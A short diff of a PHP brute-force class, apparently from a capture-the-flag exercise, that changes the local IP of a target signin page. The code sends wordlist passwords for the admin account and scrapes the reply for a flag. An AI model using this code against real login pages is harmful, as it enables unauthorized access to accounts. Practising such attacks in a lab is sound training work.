@@ -20,7 +20,7 @@ Class brut_force {
 
 			$value = str_replace("\n", "", $value);
 
-			$rep = file_get_contents('http://192.168.1.38/index.php?page=signin&username=admin&password='.$value.'&Login=Login#');
+			$rep = file_get_contents('http://192.168.1.16/index.php?page=signin&username=admin&password='.$value.'&Login=Login#');
 			preg_match_all("#flag is :(.*)</h2>#", $rep, $matches);
 			
 			if (isset($matches[1][0])) {
